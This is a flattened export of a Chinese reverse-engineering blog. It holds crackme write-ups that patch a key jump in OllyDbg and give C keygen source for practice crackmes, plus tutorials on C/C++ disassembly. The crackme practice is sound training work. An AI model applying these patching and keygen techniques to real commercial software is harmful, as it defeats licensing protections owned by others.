8B55 F0 mov edx,[local.4] ; 1230042FAFB |. 8B45 F4 mov eax,[local.3] ; CW-9430-CRACKED0042FAFE |. E8 F93EFDFF call Acid_bur.004039FC ; 判断是否正确0042FB03 75 1A jnz short Acid_bur.0042FB1F ; 关键跳转0042FB05 |. 6A 00 push 0x00042FB07 |. B9 CCFB4200 mov ecx,Acid_bur.0042FBCC ; Congratz !!0042FB0C |. BA D8FB4200 mov edx,Acid_bur.0042FBD8 ; Good job dude =) 1.0x74*0x8-0x74=0x32c,0x74是用户名第1个字符t的ASCII码 2.0x75*0x10+0x32c=0xa7c,0x75是第2个字符u的ASCII码 3.0x75*0xb=0x507,0x75是第4个字符u的ASCII码 4.0x74*0xe=0x658,0x658+0x507=0xb5f=2911,0x74是第3个字符t的ASCII码 5.0x290x740x2 = 0x2528 = 9512,0x74是首字符的ASCII码，0x29和0x2都是固定的 然后最后程序还是会进入0042FAF3这个地址，然后我们进入这个关键call 12345678004039FC /$ 53 push ebx004039FD |. 56 push esi004039FE |. 57 push edi004039FF |. 89C6 mov esi,eax00403A01 |. 89D7 mov edi,edx00403A03 |. 39D0 cmp eax,edx 取第一个字母的ASCI的数字，如systemk1t的第一个字符对应的数字就是0x73，然后乘以0x29，结果再自增一倍，得到的数字转为10进制的字符串，再前面加上”CW-“，后加上”-CRACKED”，就组成了对应的注册码。 12345678910111213141516171819202122232425// CrackMe.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;iostream&gt;int _tmain(int argc, _TCHAR* argv[]){ std::cout &lt;&lt; &quot;请输入用户名&quot; &lt;&lt; std::endl; int cName = getchar(); //取得用户第一个输入 if (cName &gt; 0x21) { cName *= 0x29; //乘以0x29 cName *= 2; //然后乘以2 printf(&quot;Serial: CW-%4d-CRACKED\\r\\n&quot;,cName); } else { printf(&quot;Error&quot;); } system(&quot;pause&quot;); return 0;} 最后将结果拼接一下","link":"/2019/12/20/CrackMe001/"},{"title":"CrackMe002","text":"一步步尝试将160个CrackMe全部破解，如果可以，通过任何方式写出一个类似于注册机的东西 环境 WinXP Sp3 + 52Pojie六周年OllyDbg + PEID(0.95) 软件下载地址： https://github.com/sYstemk1t/Code-collection/tree/master/CrackMe/2 程序分析 想要破解一个程序，必须先了解这个程序。所以，在破解过程中，对最初程序的分析很重要，他可以帮助我们理解作者的目的和意图，特别是对于注册码的处理细节，从而方便我们反向跟踪和推导。 打开chm文件，下载第一个文件到指定目录， 不推荐直接在桌面运行 。 程序只有一个登录窗口，然后我们随便输入，多输入几次，看看结果。 我们随意输入伪码： Name:systemk1t Serial:123 点击Ok，弹出You Get Wrong，Try Again。 然后继续随意输入几个，发现只有这一种情况，不会判断输入的长度。 具体分析将程序载入OD中，输入我们的伪码，回到OD中，点击暂停按钮，F12，然后查看堆栈 因为VB编写的程序我也不懂，看地址的话，只有一个地址相对比较近，我们进入这个地址，显示调用，进入了这个地址，然后往上翻，距离上一个retn有点远，然后我们主要找向上中存在的跳转。 123456789101112131415161718192021222324252627282930313233004025E3 . /EB 56 jmp short Afkayas_.0040263B ; jmp跳转到正确的注册点004025E5 &gt; |68 C81B4000 push Afkayas_.00401BC8 ; You Get Wrong004025EA . |68 9C1B4000 push Afkayas_.00401B9C ; \\r\\n004025EF . |FFD7 call edi004025F1 . |8BD0 mov edx,eax004025F3 . |8D4D E8 lea ecx,dword ptr ss:[ebp-0x18]004025F6 . |FFD3 call ebx004025F8 . |50 push eax004025F9 . |68 E81B4000 push Afkayas_.00401BE8 ; Try Again004025FE . |FFD7 call edi00402600 . |8945 CC mov dword ptr ss:[ebp-0x34],eax00402603 . |8D45 94 lea eax,dword ptr ss:[ebp-0x6C]00402606 . |8D4D A4 lea ecx,dword ptr ss:[ebp-0x5C]00402609 . |50 push eax0040260A . |8D55 B4 lea edx,dword ptr ss:[ebp-0x4C]0040260D . |51 push ecx0040260E . |52 push edx0040260F . |8D45 C4 lea eax,dword ptr ss:[ebp-0x3C]00402612 . |6A 00 push 0x000402614 . |50 push eax00402615 . |C745 C4 08000&gt;mov dword ptr ss:[ebp-0x3C],0x80040261C . |FF15 10414000 call dword ptr ds:[&lt;&amp;MSVBVM50.#rtcMsgBox&gt;; msvbvm50.rtcMsgBox00402622 . |8D4D E8 lea ecx,dword ptr ss:[ebp-0x18]00402625 . |FF15 80414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;; msvbvm50.__vbaFreeStr0040262B . |8D4D 94 lea ecx,dword ptr ss:[ebp-0x6C]0040262E . |8D55 A4 lea edx,dword ptr ss:[ebp-0x5C]00402631 . |51 push ecx00402632 . |8D45 B4 lea eax,dword ptr ss:[ebp-0x4C]00402635 . |52 push edx00402636 . |8D4D C4 lea ecx,dword ptr ss:[ebp-0x3C]00402639 . |50 push eax0040263A . |51 push ecx0040263B &gt; \\6A 04 push 0x4 然后继续向上翻，找到了一个je，当ZF为1时跳转，即和上面的test结果有关 123456789101112131415161718192021222324252627282930313233340040258B . /74 58 je short Afkayas_.004025E5 ; 关键跳转0040258D . |68 801B4000 push Afkayas_.00401B80 ; You Get It00402592 . |68 9C1B4000 push Afkayas_.00401B9C ; \\r\\n00402597 . |FFD7 call edi00402599 . |8BD0 mov edx,eax0040259B . |8D4D E8 lea ecx,dword ptr ss:[ebp-0x18]0040259E . |FFD3 call ebx004025A0 . |50 push eax004025A1 . |68 A81B4000 push Afkayas_.00401BA8 ; KeyGen It Now004025A6 . |FFD7 call edi004025A8 . |8D4D 94 lea ecx,dword ptr ss:[ebp-0x6C]004025AB . |8945 CC mov dword ptr ss:[ebp-0x34],eax004025AE . |8D55 A4 lea edx,dword ptr ss:[ebp-0x5C]004025B1 . |51 push ecx004025B2 . |8D45 B4 lea eax,dword ptr ss:[ebp-0x4C]004025B5 . |52 push edx004025B6 . |50 push eax004025B7 . |8D4D C4 lea ecx,dword ptr ss:[ebp-0x3C]004025BA . |6A 00 push 0x0004025BC . |51 push ecx004025BD . |C745 C4 08000&gt;mov dword ptr ss:[ebp-0x3C],0x8004025C4 . |FF15 10414000 call dword ptr ds:[&lt;&amp;MSVBVM50.#rtcMsgBox&gt;; msvbvm50.rtcMsgBox004025CA . |8D4D E8 lea ecx,dword ptr ss:[ebp-0x18]004025CD . |FF15 80414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;; msvbvm50.__vbaFreeStr004025D3 . |8D55 94 lea edx,dword ptr ss:[ebp-0x6C]004025D6 . |8D45 A4 lea eax,dword ptr ss:[ebp-0x5C]004025D9 . |52 push edx004025DA . |8D4D B4 lea ecx,dword ptr ss:[ebp-0x4C]004025DD . |50 push eax004025DE . |8D55 C4 lea edx,dword ptr ss:[ebp-0x3C]004025E1 . |51 push ecx004025E2 . |52 push edx004025E3 . |EB 56 jmp short Afkayas_.0040263B ; jmp跳转到正确的注册点004025E5 &gt; \\68 C81B4000 push Afkayas_.00401BC8 ; You Get Wrong 查看一下test的代码： 1234567891000402569 . 83C4 0C add esp,0xC0040256C . B9 04000280 mov ecx,0x8002000400402571 . B8 0A000000 mov eax,0xA00402576 . 894D 9C mov dword ptr ss:[ebp-0x64],ecx00402579 . 66:85F6 test si,si ;test结果决定是否跳转0040257C . 8945 94 mov dword ptr ss:[ebp-0x6C],eax0040257F . 894D AC mov dword ptr ss:[ebp-0x54],ecx00402582 . 8945 A4 mov dword ptr ss:[ebp-0x5C],eax00402585 . 894D BC mov dword ptr ss:[ebp-0x44],ecx00402588 . 8945 B4 mov dword ptr ss:[ebp-0x4C],eax 我们首先尝试一下，将je修改为jne，然后让程序跑起来查看一下 算法然后我们在je往上继续翻，开始逐步分析算法，生成注册机 12345678910111213141500402412 . 50 push eax ; /eax=systemk1t00402413 . 8B1A mov ebx,dword ptr ds:[edx] ; |00402415 . FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBs&gt;; \\__vbaLenBstr0040241B . 8BF8 mov edi,eax ; eax=90040241D . 8B4D E8 mov ecx,dword ptr ss:[ebp-0x18]00402420 . 69FF FB7C0100 imul edi,edi,0x17CFB ; 0x09*0x17CFB00402426 . 51 push ecx ; /String = &quot;?&quot;00402427 . 0F80 91020000 jo Afkayas_.004026BE ; |0040242D . FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#rtcAnsiVa&gt;; \\rtcAnsiValueBstr00402433 . 0FBFD0 movsx edx,ax00402436 . 03FA add edi,edx ; edi=edi+edx（此为用户名第一个字符的ANSI码）00402438 . 0F80 80020000 jo Afkayas_.004026BE0040243E . 57 push edi0040243F . FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;; msvbvm50.__vbaStrI400402445 . 8BD0 mov edx,eax ; eax=877894 注册机1234567891011121314151617181920212223242526272829// CrackMe.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;stdio.h&gt;char buff[64] = {&quot;systemk1t&quot;}; int _tmain(int argc, _TCHAR* argv[]){ printf(&quot;请输入用户名:&quot;); int len = strlen(buff); if(len&gt;0) { int nRet = len * 0x17CFB; nRet += buff[0]; printf(&quot;AKA-%d&quot;,nRet); } else { printf(&quot;ERROR&quot;); } system(&quot;pause&quot;); return 0;}","link":"/2019/12/21/CrackMe002/"},{"title":"C反汇编 - this指针","text":"在 C++ 中，每一个对象都能通过 this 指针来访问自己的地址。this 指针是所有成员函数的隐含参数。因此，在成员函数内部，它可以用来指向调用对象。 this指针定义友元函数没有 this 指针，因为友元不是类的成员。只有成员函数才有 this 指针。 12345678910111213141516171819#include &lt;stdio.h&gt;struct Student{ int a; int b; int c; int d; void Add() //结构体内部写一个函数 { ; }};int main(){ struct Student s = {1,2,3,4}; s.Add(); //函数 return 0;} 1234567815: struct Student s = {1,2,3,4};00401038 mov dword ptr [ebp-10h],10040103F mov dword ptr [ebp-0Ch],200401046 mov dword ptr [ebp-8],30040104D mov dword ptr [ebp-4],416: s.Add();00401054 lea ecx,[ebp-10h] //this指针 this指针是编译器默认传入，通常都会使用ecx寄存器进行参数的传递 使用this指针123456789101112131415161718192021222324#include &lt;stdio.h&gt;struct Student{ int a; int b; int c; int d; void Add(int a,int b,int c,int d) { this-&gt;a = a; this-&gt;b = b; this-&gt;c = c; this-&gt;d = d; }};int main(){ Student s; s.Add(10,20,30,40); return 0;} 反汇编代码： 123456789101112131415161718192021222324252627282922: s.Add(10,20,30,40);0040D408 push 28h0040D40A push 1Eh0040D40C push 14h0040D40E push 0Ah0040D410 lea ecx,[ebp-10h] //this指针存入ecx寄存器中0040D44A mov dword ptr [ebp-4],ecx //ecx寄存器中保存的就是this指针11: this-&gt;a = a;0040D44D mov eax,dword ptr [ebp-4] //this指针放入eax寄存器中,[ebp-4]是局部变量?Add@Student@@QAEXHH@Z:0040D450 mov ecx,dword ptr [ebp+8] //[ebp+8]第一个参数存入ecx中0040D453 mov dword ptr [eax],ecx //以eax作为索引，将ecx放入12: this-&gt;b = b;0040D455 mov edx,dword ptr [ebp-4]0040D458 mov eax,dword ptr [ebp+0Ch]0040D45B mov dword ptr [edx+4],eax13: this-&gt;c = c;0040D45E mov ecx,dword ptr [ebp-4]0040D461 mov edx,dword ptr [ebp+10h]0040D464 mov dword ptr [ecx+8],edx14: this-&gt;d = d;0040D467 mov eax,dword ptr [ebp-4]0040D46A mov ecx,dword ptr [ebp+14h]0040D46D mov dword ptr [eax+0Ch],ecx15: } 成员函数都有this指针，不论是否使用 this指针不能做运算 this指针不占用结构体的宽度 Demo1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;struct Student{ int a; int b; int c; int d; void Add(int a,int b,int c,int d) { this-&gt;a = a; this-&gt;b = b; this-&gt;c = c; this-&gt;d = d; } void Sub(int a,int b) { printf(&quot;%d\\r\\n&quot;,this-&gt;a); printf(&quot;%d\\r\\n&quot;,this-&gt;b); printf(&quot;%d\\r\\n&quot;,a); printf(&quot;%d\\r\\n&quot;,b); }};int main(){ Student s; s.Add(10,20,30,40); s.Sub(50,70); return 0;} 做一个简单的思考，为什么Sub函数内我们传递的两个参数没有被正确的打印； 我们查看反汇编代码： 12345678910111213141529: s.Add(10,20,30,40);0040D4E8 push 28h0040D4EA push 1Eh0040D4EC push 14h0040D4EE push 0Ah0040D4F0 lea ecx,[ebp-10h] //this指针0040D4F3 call @ILT+10(Student::Add) (0040100f)30: s.Sub(50,70,4,7);0040D4F8 push 70040D4FA push 40040D4FC push 46h0040D4FE push 32h0040D500 lea ecx,[ebp-10h] //this指针0040D503 call @ILT+30(Student::Sub) (00401023) 我们可可以看到两个函数传递this指针的时候都是[ebp-10]，那么证明，结构体只接受了我们第一次的赋值； 我们可以修改一下，打印的结果就不同了； 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;struct Student{ int a; int b; int c; int d; void Add(int a,int b,int c,int d) { this-&gt;a = a; this-&gt;b = b; this-&gt;c = c; this-&gt;d = d; } void Sub(int a,int b,int c,int d) { printf(&quot;%d\\r\\n&quot;,this-&gt;a); printf(&quot;%d\\r\\n&quot;,this-&gt;b); printf(&quot;%d\\r\\n&quot;,a); printf(&quot;%d\\r\\n&quot;,b); }};int main(){ Student s[2]; s[0].Add(10,20,30,40); s[1].Sub(50,70,4,7); return 0;} 查看一下反汇编： 12345678910111213141529: s[0].Add(10,20,30,40);0040D4E8 push 28h0040D4EA push 1Eh0040D4EC push 14h0040D4EE push 0Ah0040D4F0 lea ecx,[ebp-20h] //this指针0040D4F3 call @ILT+10(Student::Add) (0040100f)30: s[1].Sub(50,70,4,7);0040D4F8 push 70040D4FA push 40040D4FC push 46h0040D4FE push 32h0040D500 lea ecx,[ebp-10h] //this指针0040D503 call @ILT+30(Student::Sub) (00401023)","link":"/2020/05/06/C%E5%8F%8D%E6%B1%87%E7%BC%96-this%E6%8C%87%E9%92%88/"},{"title":"C反汇编 - 函数","text":"函数在高级语言中就是一串指令的集合； 函数什么是函数函数就是一些列指令的集合，为了完成某个会重复使用的特定功能。 C语言中函数的格式如下： 1234返回类型 函数名(参数列表){ ...code} 返回类型、函数名不可以省略 只能以字母、数字、下划线组成，且第一个字母必须为字母或下划线 区分大小写 不可以使用C关键字 汇编写一个函数1234567891011121300401000 | 8B4C24 04 | mov ecx,dword ptr ss:[esp+4] | [esp+4]:PEB.InheritedAddressSpace00401004 | 8B4424 08 | mov eax,dword ptr ss:[esp+8] |00401008 | 03C1 | add eax,ecx |0040100A | C3 | ret |0040100B | CC | int3 |0040100C | CC | int3 |0040100D | CC | int3 |0040100E | CC | int3 |0040100F | CC | int3 |00401010 | 6A 02 | push 2 |00401012 | 6A 01 | push 1 |00401014 | E8 E7FFFFFF | call asm.401000 ;进入函数调用 |00401019 | 83C4 08 | add esp,8 ;外平衡堆栈 C编写函数12345678910#include &lt;stdio.h&gt;int f(int x,int y){ return x + y;}int main(){ f(1,2); return 0; //执行结束} 参数参数的传递方式通常使用栈传递，并且使用stdcall调用方式； vc6编译器有一个特点：call函数进入并不是真正的函数，而是一个jmp，jmp到我们真正的函数体中； 汇编下的函数​​ 计算机的函数，是一个固定的一个程序段，或称其为一个子程序，它在可以实现固定运算功能的同时还带有一入口和一个出口，所谓的入口，就是函数所带的各个参数，我们可以通过这个入口，把函数的参数值代入子程序，供计算机处理，所谓出口，就是指函数的计算结果,也称为返回值，在计算机求得之后，由此口带回给调用它的程序。 汇编中的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041PUSH EBP 提升堆栈，为函数执行提供空间 MOV EBP,ESP SUB ESP,40 PUSH EBX 保留现场：函数在执行的时候会用到一些寄存器，但这些寄存器中的值很可能会被后面的 PUSH ESI 程序用到，所以要先存储到内存中 PUSH EDI LEA EDI,DWORD PTR SS:[EBP-40] 向分配的空间填充数据 MOV ECX,10 MOV EAX,CCCCCCCC REP STOS DWORD PTR ES:[EDI] MOV EAX,DWORD PTR SS:[EBP+8] 该函数的功能 ADD EAX,DWORD PTR SS:[EBP+C] POP EDI 恢复现场：将之前保留的寄存器的值恢复 POP ESI POP EBX MOV ESP,EBP 降低堆栈 POP EBP 恢复栈底 RETN 函数执行完毕，返回到调用处 函数的入口： PUSH 2 函数的参数 PUSH 1 CALL 0040100A 调用函数 函数的出口： MOV EAX,DWORD PTR SS:[EBP+8] 上面的这个函数将计算结果存储到EAX中 ADD EAX,DWORD PTR SS:[EBP+C] 我们称为返回值","link":"/2020/04/28/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E5%87%BD%E6%95%B0/"},{"title":"C反汇编 - 函数指针","text":"如果在程序中定义了一个函数，那么在编译时系统就会为这个函数代码分配一段存储空间，这段存储空间的首地址称为这个函数的地址 函数指针定义返回类型(*函数名)(参数表)如：int (*pFun)(int,int); 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;windows.h&gt;int fun(int a,int b){ return a+b;}int main(){ //定义函数指针变量 int (__cdecl *pFun)(int,int); //定义了一个有两个变量的函数指针 //为函数指针变量赋值 pFun = (int (__cdecl *)(int,int))fun; //给函数指针赋值，pFun中存放的是fun函数的地址 int r = pFun(1,2); //正常函数调用 printf(&quot;%d\\r\\n&quot;,r); return 0;} 赋值123pFun = (int (*)(int,int))10;或者 pFun = 函数名. typedef12345678910 typedef int (*Fun)(int,int); 这个不是变量的声明，而是为函数指针起个别名：Fun 相当于函数指针类型 Fun p; 这个才是变量的声明，p是变量，Fun是类型. 隐藏代码123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;int main(){ //定义函数指针类型变量 //int (__stdcall *pFun)(int,int,int,int,int); int (__stdcall *pFun)(int,int,int,int); //pFun = (int (__stdcall *)(int,int,int,int,int)) 0x75CBFD1E; MessageBox(NULL,&quot;123&quot;,&quot;321&quot;,0); //正常MessageBox pFun = (int (__stdcall *)(int,int,int,int)) &amp;MessageBox; //使用pFun弹出MessageBox pFun(0,0,0,0); return 0;}","link":"/2020/05/06/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/"},{"title":"C反汇编 - 参数","text":"参数，也叫参变量，是一个变量； 参数参数内存布局写一个例子： 123456789101112#include &lt;stdio.h&gt;int Add(int x,int y){ int z = x + y; return z;}int main(){ Add(1,2); return 0;} 我们通过解释汇编代码来学习内存的布局： 123456710: Add(1,2); 00401078 push 2 ;第二个参数入栈0040107A push 1 ;第一个参数入栈0040107C call @ILT+0(_Add) (00401005) ;汇编通过call来调用函数00401081 add esp,8 C语言默认使用stdcall的方式来调用参数 总结一下： ebp+8开始是参数 esp-4开始是局部变量 返回值返回值通常存储在EAX寄存器中； 125: return z;00401041 mov eax,dword ptr [ebp-4] 使用返回值12300401084 mov dword ptr [ebp-4],eax ;返回值存储在eax中，eax赋值给[ebp-4]的位置12: printf(&quot;%d\\r\\n&quot;,c);00401087 mov eax,dword ptr [ebp-4] ;[ebp-4]的位置的数据传递给eax","link":"/2020/04/29/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E5%8F%82%E6%95%B0/"},{"title":"C反汇编 - 参数传递","text":"参数传递，是在程序运行过程中，实际参数就会将参数值传递给相应的形式参数，然后在函数中实现对数据处理和返回的过程，方法有按值传递参数，按地址传递参数和按数组传递参数。 参数传递值传递1234567891011121314#include &lt;stdio.h&gt;void Add(int x){ x = x + 1;}int main(){ int i = 0; Add(i); printf(&quot;%d\\r\\n&quot;,i); return 0;} 反汇编代码: 1234541: int i = 0;00401108 mov dword ptr [ebp-4],042: Add(i);0040110F mov eax,dword ptr [ebp-4]00401112 push eax 值传递每次传递的就是这个变量的值 数组传递12345678910111213141516171819#include &lt;stdio.h&gt;int fun(int *a,int len){ int i = 0; for(;i&lt;len;i++) { printf(&quot;%d\\r\\n&quot;,a[i]); } return 0;}int main(){ int Array[]= {1,2,3,4,5,6,7,8,9,10}; int Index = sizeof(Array) / sizeof(int); fun(Array,Index); return 0;} 反汇编代码： 123456789101112131415161718192045: int Array[]= {1,2,3,4,5,6,7,8,9,10};00401108 mov dword ptr [ebp-28h],10040110F mov dword ptr [ebp-24h],200401116 mov dword ptr [ebp-20h],30040111D mov dword ptr [ebp-1Ch],400401124 mov dword ptr [ebp-18h],50040112B mov dword ptr [ebp-14h],600401132 mov dword ptr [ebp-10h],700401139 mov dword ptr [ebp-0Ch],800401140 mov dword ptr [ebp-8],900401147 mov dword ptr [ebp-4],0Ah47: fun(Array,Index);00401155 mov eax,dword ptr [ebp-2Ch]00401158 push eax00401159 lea ecx,[ebp-28h]0040115C push ecx0040115D call @ILT+5(fun) (0040100a)00401162 add esp,8 函数反汇编： 12348: printf(&quot;%d\\r\\n&quot;,a[i]);00401062 mov edx,dword ptr [ebp-4]00401065 mov eax,dword ptr [ebp+8] ;ebp+8为参数00401068 mov ecx,dword ptr [eax+edx*4] ;edx为索引(下标),数据宽度为4 数组为参数的时候，传递的是地址 数组作为参数的时候，需要写数组长度 指针传递12345678910111213141516171819void Print(int* p,int Index){ int i = 0; for(;i&lt;Index;i++) { printf(&quot;%d\\r\\n&quot;,p[i]); }}int main(){ int Array[]= {1,2,3,4,5,6,7,8,9,10}; int Index = sizeof(Array) / sizeof(int); Print(Array,Index); //fun(Array,Index); return 0;} 反汇编代码： 1234567891011121314151617181920212245: int Array[]= {1,2,3,4,5,6,7,8,9,10};00401108 mov dword ptr [ebp-28h],10040110F mov dword ptr [ebp-24h],200401116 mov dword ptr [ebp-20h],30040111D mov dword ptr [ebp-1Ch],400401124 mov dword ptr [ebp-18h],50040112B mov dword ptr [ebp-14h],600401132 mov dword ptr [ebp-10h],700401139 mov dword ptr [ebp-0Ch],800401140 mov dword ptr [ebp-8],900401147 mov dword ptr [ebp-4],0Ah59: Print(Array,Index);0040D8A5 mov eax,dword ptr [ebp-2Ch]0040D8A8 push eax0040D8A9 lea ecx,[ebp-28h]0040D8AC push ecx0040D8AD call @ILT+15(fun) (00401014)0040D8B2 add esp,8 函数反汇编： 12345670040105D cmp ecx,dword ptr [ebp+0Ch]00401060 jge Print+4Bh (0040107b)44: {45: printf(&quot;%d\\r\\n&quot;,p[i]);00401062 mov edx,dword ptr [ebp-4]00401065 mov eax,dword ptr [ebp+8]00401068 mov ecx,dword ptr [eax+edx*4] 指针传递和数组传递没有差异，都是传递是地址 两种实现方式123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt;int fun(int *a,int len){ int i = 0; for(;i&lt;len;i++) { printf(&quot;%d\\r\\n&quot;,a[i]); printf(&quot;%d\\r\\n&quot;,*(a+i)); } return 0;}void Print(int Array[],int Index){ int i = 0; for(;i&lt;Index;i++) { printf(&quot;%d\\r\\n&quot;,Array[i]); printf(&quot;%d\\r\\n&quot;,*(Array+i)); }}int main(){ /*int i = 0; Add(i); printf(&quot;%d\\r\\n&quot;,i); */ int Array[]= {1,2,3,4,5,6,7,8,9,10}; int Index = sizeof(Array) / sizeof(int); Print(Array,Index); fun(Array,Index); return 0;}","link":"/2020/05/05/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92/"},{"title":"C反汇编 - 变量","text":"变量名只是内存编号的别名； 变量变量声明变量名的命名规则： 只能以字母、数字、下划线组成，且第一个字母必须是字母或下划线 区分大小写 不可以使用C关键字 变量的声明一般使用 1234类型 变量名int i; //整形char c; //字符short s; //短整形 全局变量全局变量在编译的时候已经确定了内存地址和宽度，变量名就是内存地址的别名。 如果不重写编译，全局变量的内存地址不变。 全局变量中的值在任意一个函数中都可以使用。 Demo: 1234567#include &lt;stdio.h&gt;int i;int main(){ i = 1; return 0;} 我们去查看反汇编中的代码： 125: i = 1;00401028 mov dword ptr [_i (00427e44)],1 使用调试器查看： 执行后： 局部变量局部变量，也称内部变量，是指在一个函数内部或复合语句内部定义的变量。局部变量的作用域是定义该变量的函数或定义该变量的复合语句。局部变量的生存期是从函数被调用的时刻算起到函数返回调用处的时刻结束。 Demo： 12345678910111213#include &lt;stdio.h&gt;int Add(){ int x = 1234567; //局部变量 int y = 7654321; return 0;}int main(){ Add(); return 0;} 我们看一会反汇编代码： 12344: int x = 1234567; //局部变量00401038 mov dword ptr [ebp-4],12D687h5: int y = 7654321;0040103F mov dword ptr [ebp-8],74CBB1h 局部变量是函数内部申请的，如果函数没有执行，那么局部变量没有内存空间。 局部变量的内存是在堆栈中分配的，程序执行时分配。我们无法预知程序在何时调用，也就意味着我们无法确定局部变量的内存地址。 因为局部变量地址内存是不确定的，所以局部变量只能在函数内部使用。","link":"/2020/04/29/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E5%8F%98%E9%87%8F/"},{"title":"C反汇编 - 堆对象","text":"对象可以创建在全局变量区，也可以在栈区，也可以在堆区； 堆对象定义堆对象其实与malloc为结构体在堆中申请内存无疑，只是修改了关键字，C语言中使用malloc函数，C++中使用new函数； 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class Base{public: Base(int a,int b) { x = a; y = b; cout &lt;&lt; &quot;Base构造函数&quot; &lt;&lt; endl; } Base() { ; } ~Base() { cout &lt;&lt;&quot;析构函数调用了&quot; &lt;&lt; endl; } protected: int x;private: int y;};int main(){ //在堆中创建一个对象 Base* b = new Base(1,2); //释放堆中的对象 delete b; return 0;} C和C++分别堆申请C申请数组1234567#include &lt;stdio.h&gt;int main(){ int Array[10]; int* p = (int*)malloc(sizeof(int)*10); //申请 free(p); //释放} C++申请class类型数组123456789101112131415#include &lt;iostream&gt;using namespace std;class Base{ public: int x; int y;};int main(){ Base b; Base* p = (Base*)malloc(sizeof(b)*10); //C写法 Base* p1 = new Base[10]; //C++写法 return 0;} 如果创建一个对象数组，那么可以使用malloc和free 有多个对象数组的时候，删除使用delete[]，一个使用delete","link":"/2020/05/08/C%E5%8F%8D%E6%B1%87%E7%BC%96-%E5%A0%86%E5%AF%B9%E8%B1%A1/"},{"title":"C反汇编 - 多态","text":"如果将基类中的某个成员函数声明为虚函数，那么其子类中与该函数具有相同原型的成员函数就也是虚函数，并且对基类中的版本形成覆盖。这时，通过指向子类对象的基类指针，或者引用子类对象的基类引用，调用虚函数，实际被执行的将是子类中的覆盖版本，而非基类中的原始版本，这种语法现象被称为多态。 多态虚函数继承实现多态123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;class A{public: int a; int b; A() { ; } A(int a,int b) { this-&gt;a = a; this-&gt;b = b; } void My_Print() { printf(&quot;%d %d&quot;,a,b); }protected:private:};class B : public A{public: int c; B(int a,int b,int c) : A(a,b) { this-&gt;c = c; } void SetC(int c) { this-&gt;c = c; } void My_Print() { A::My_Print(); printf(&quot;%d&quot;,c); }protected:private:};void My_Print(A&amp; p){ p.My_Print();}int main(){ B a(1,2,3); My_Print(a); return 0;} 多态实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;class A{public: int a; int b; A(int a,int b) { this-&gt;a = a; this-&gt;b = b; } virtual void My_Print() { printf(&quot;%d %d&quot;,a,b); }protected:private:};class B : public A{public: int c; B(int a,int b,int c) : A(a,b) { this-&gt;c = c; } void SetC(int c) { this-&gt;c = c; } void My_Print() { A::My_Print(); printf(&quot;%d&quot;,c); }protected:private:};void My_Print(A* p) //多态就是可以让父类的指针有多种形态{ p-&gt;My_Print();}int main(){ B a(1,2,3); My_Print(&amp;a); return 0;} C++通过虚函数来实现多态 纯虚函数12345class CShape{public: virtual void Show()=0;}; 在普通的虚函数后面加上”=0”这样就声明了一个pure virtual function. 抽象类抽象类不可以初始化 虚表123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;using namespace std;class A{public: int x; virtual void test() { printf(&quot;A\\r\\n&quot;); }protected:private:};class B : public A{public: void test() { printf(&quot;B\\r\\n&quot;); }protected:private:};void My_Print(A* p){ p-&gt;test();}int main(){ A a; B b; My_Print(&amp;a); return 0;} 不使用虚函数123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;using namespace std;class A{public: int x; void test() { printf(&quot;A\\r\\n&quot;); }protected:private:};class B : public A{public: void test() { printf(&quot;B\\r\\n&quot;); }protected:private:};void My_Print(A* p){ p-&gt;test();}int main(){ A a; B b; My_Print(&amp;a); return 0;} 我们查看反汇编代码： 1234567891011121314151626: void My_Print(A* p)27: {00401040 push ebp00401041 mov ebp,esp00401043 sub esp,40h00401046 push ebx00401047 push esi00401048 push edi00401049 lea edi,[ebp-40h]0040104C mov ecx,10h00401051 mov eax,0CCCCCCCCh00401056 rep stos dword ptr [edi]28: p-&gt;test();00401058 mov ecx,dword ptr [ebp+8]0040105B call @ILT+5(A::test) (0040100a) //已经确定了传入的函数为A::test,所以我们传递的参数已经不重要了29: } 使用虚函数123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;using namespace std;class A{public: int x; virtual void test() { printf(&quot;A\\r\\n&quot;); }protected:private:};class B : public A{public: void test() { printf(&quot;B\\r\\n&quot;); }protected:private:};void My_Print(A* p){ p-&gt;test();}int main(){ A a; B b; My_Print(&amp;a); return 0;} 反汇编代码查看： 12345678910111213141516171826: void My_Print(A* p)27: {00401060 push ebp00401061 mov ebp,esp00401063 sub esp,40h00401066 push ebx00401067 push esi00401068 push edi00401069 lea edi,[ebp-40h]0040106C mov ecx,10h00401071 mov eax,0CCCCCCCCh00401076 rep stos dword ptr [edi]28: p-&gt;test(); //间接调用00401078 mov eax,dword ptr [ebp+8] //取参数，参数是一个指针0040107B mov edx,dword ptr [eax] //取当前对象第一个成员0040107D mov esi,esp 0040107F mov ecx,dword ptr [ebp+8] //将传递的参数放入ecx中00401082 